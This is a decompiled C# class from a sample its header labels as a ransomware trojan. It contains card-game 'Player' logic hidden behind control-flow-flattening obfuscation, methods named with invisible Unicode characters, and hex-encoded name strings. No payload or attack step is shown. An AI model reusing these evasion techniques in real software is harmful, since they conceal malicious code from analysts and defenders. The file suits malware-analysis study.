// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: PInvokeAttribut, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: D5FBD274-2C02-4186-9C35-1EE6A67C7338
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-1aab9260ecb3ef6b3d07882eff498982f5146fb73a61ff77f8ea0dfbfb02cde7.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = -2026515660;
      string str1;
      bool flag1;
      bool flag2;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1950049555)) % 12U)
        {
          case 0:
            int num3 = flag1 ? -266597093 : (num3 = -1649579839);
            num1 = num3 ^ (int) num2 * 378545795;
            continue;
          case 1:
            str1 = "376F4C6958";
            num1 = (int) num2 * -2031400749 ^ 1095994577;
            continue;
          case 2:
            int num4 = flag2 ? -1052296707 : (num4 = -819774956);
            num1 = num4 ^ (int) num2 * -1918623561;
            continue;
          case 3:
            str1 = "45617374417369616E4C756E69736F6C617243616C656E64";
            num1 = (int) num2 * 733190687 ^ 1671928;
            continue;
          case 4:
            num1 = (int) num2 * -1567919021 ^ -1472225242;
            continue;
          case 6:
            num1 = (int) num2 * 845050373 ^ 702836850;
            continue;
          case 7:
            str2 = str1;
            num1 = -1834217560;
            continue;
          case 8:
            flag2 = BaseStream == 1;
            num1 = -1987426369;
            continue;
          case 9:
            str1 = (string) null;
            flag1 = BaseStream == 0;
            num1 = (int) num2 * -1725780714 ^ 502024683;
            continue;
          case 10:
            num1 = (int) num2 * -1929069425 ^ 805160200;
            continue;
          case 11:
            goto label_1;
          default:
            goto label_13;
        }
      }
label_13:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
label_1:
      int num1 = -1224511641;
      int num2;
      while (true)
      {
        uint num3;
        int num4;
        switch ((num3 = (uint) (num1 ^ -940852468)) % 5U)
        {
          case 0:
            goto label_1;
          case 2:
            num1 = (int) num3 * -1652542929 ^ -1232641368;
            continue;
          case 3:
            if (this.PlanningCards.Length == 0)
            {
              num1 = (int) num3 * 1906667467 ^ 474436543;
              continue;
            }
            num4 = this.PlanningCards[cardTypeIndex];
            break;
          case 4:
            num4 = 0;
            break;
          default:
            goto label_9;
        }
        num2 = num4;
        num1 = -282717225;
      }
label_9:
      return num2;
    }

    public int PlanningCardsCount
    {
      get
      {
        int num1 = 0;
label_1:
        int num2 = -1035224973;
        int[] planningCards;
        int num3;
        bool flag;
        int planningCardsCount;
        int index;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num2 ^ -1448296325)) % 15U)
          {
            case 0:
              int num5;
              num2 = num5 = index < planningCards.Length ? -866297492 : (num5 = -2002615188);
              continue;
            case 1:
              planningCards = this.PlanningCards;
              num2 = (int) num4 * -23840109 ^ 1234153860;
              continue;
            case 2:
              flag = num3 > 0;
              num2 = (int) num4 * 1219957145 ^ -1465359065;
              continue;
            case 3:
              planningCardsCount = num1;
              num2 = (int) num4 * -535883486 ^ -1770108428;
              continue;
            case 4:
              num2 = (int) num4 * -1738498939 ^ 98852763;
              continue;
            case 5:
              goto label_1;
            case 7:
              int num6 = !flag ? -661033362 : (num6 = -1638962482);
              num2 = num6 ^ (int) num4 * -109073978;
              continue;
            case 8:
              num3 = planningCards[index];
              num2 = -1221341545;
              continue;
            case 9:
              num2 = (int) num4 * 485796400 ^ 963637254;
              continue;
            case 10:
              num2 = (int) num4 * 177618390 ^ 785444772;
              continue;
            case 11:
              index = 0;
              num2 = (int) num4 * -208687069 ^ -1595907656;
              continue;
            case 12:
              num2 = -900449670;
              continue;
            case 13:
              ++index;
              num2 = (int) num4 * -1250371074 ^ -1233878338;
              continue;
            case 14:
              ++num1;
              num2 = (int) num4 * -455057530 ^ -1286625456;
              continue;
            default:
              goto label_16;
          }
        }
label_16:
        return planningCardsCount;
      }
    }

    private Player()
    {
label_1:
      int num1 = -2090318056;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1780579882)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            num1 = (int) num2 * 1890025662 ^ -1225990727;
            continue;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = -258545745;
      string str1;
      int index;
      int planningCard;
      bool flag;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1779649366)) % 15U)
        {
          case 1:
            num1 = (int) num2 * -1222352614 ^ 1990367456;
            continue;
          case 2:
            int num3;
            num1 = num3 = index >= this.PlanningCards.Length ? -2020472786 : (num3 = -481541447);
            continue;
          case 3:
            num1 = -1709268155;
            continue;
          case 4:
            flag = planningCard == 0;
            num1 = (int) num2 * -255787311 ^ -886206465;
            continue;
          case 5:
            ++index;
            num1 = -247123242;
            continue;
          case 6:
            str1 = Player.\u202A⁪‏⁫‌‍‎‌‭⁫⁮⁫‮‬‮⁬‏⁪‫‪​⁭‮​⁫⁬‎‌⁫⁪‏‮⁭⁭‍​‭‌‎‬‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -232111156;
            continue;
          case 7:
            goto label_1;
          case 8:
            num1 = (int) num2 * -1218141110 ^ -1892551446;
            continue;
          case 9:
            planningCard = this.PlanningCards[index];
            num1 = (int) num2 * -2142666916 ^ -597235158;
            continue;
          case 10:
            index = 0;
            num1 = (int) num2 * -1262383624 ^ -775334892;
            continue;
          case 11:
            str1 = " ";
            num1 = (int) num2 * -1468296856 ^ 748053283;
            continue;
          case 12:
            int num4 = flag ? -2019001422 : (num4 = -118362040);
            num1 = num4 ^ (int) num2 * 1563206317;
            continue;
          case 13:
            num1 = (int) num2 * 1304077537 ^ 719355369;
            continue;
          case 14:
            str2 = str1;
            num1 = (int) num2 * 139262214 ^ 686650730;
            continue;
          default:
            goto label_16;
        }
      }
label_16:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
      Player player = new Player()
      {
        Name = json["name"].Value,
        PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
        UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
      };
label_1:
      int num1 = -1799714793;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1555465610)) % 3U)
        {
          case 1:
            num1 = (int) num2 * 2114679815 ^ -1656152496;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = 1591154413;
      int aIndex;
      int count;
      bool flag;
      int[] numArray;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 7444651)) % 8U)
        {
          case 0:
            goto label_1;
          case 1:
            ++aIndex;
            num1 = (int) num2 * -259548031 ^ -1753727343;
            continue;
          case 2:
            int num3 = !flag ? -482256267 : (num3 = -2123119412);
            num1 = num3 ^ (int) num2 * -419951935;
            continue;
          case 3:
            flag = aIndex < count;
            num1 = 358920345;
            continue;
          case 4:
            planningCards = numArray;
            num1 = (int) num2 * 698910006 ^ 14772188;
            continue;
          case 5:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = 473333306;
            continue;
          case 6:
            count = json.Count;
            numArray = new int[count];
            aIndex = 0;
            num1 = (int) num2 * -1836764986 ^ 1167564708;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = 340448894;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 247320092)) % 4U)
        {
          case 1:
            num1 = (int) num2 * -743394462 ^ 505131690;
            continue;
          case 2:
            str = Player.\u206B‮‏‮⁬‌‌‬⁭‍‏⁫⁮‎‏​⁯‬‮‏‫⁮‎‪‏‭‭⁪‎⁭⁮‫​⁬⁯‍‮‍​‬‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * -424326284 ^ -1559266495;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    static string \u202A⁪‏⁫‌‍‎‌‭⁫⁮⁫‮‬‮⁬‏⁪‫‪​⁭‮​⁫⁬‎‌⁫⁪‏‮⁭⁭‍​‭‌‎‬‮([In] string[] obj0) => string.Concat(obj0);

    static string \u206B‮‏‮⁬‌‌‬⁭‍‏⁫⁮‎‏​⁯‬‮‏‫⁮‎‪‏‭‭⁪‎⁭⁮‫​⁬⁯‍‮‍​‬‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
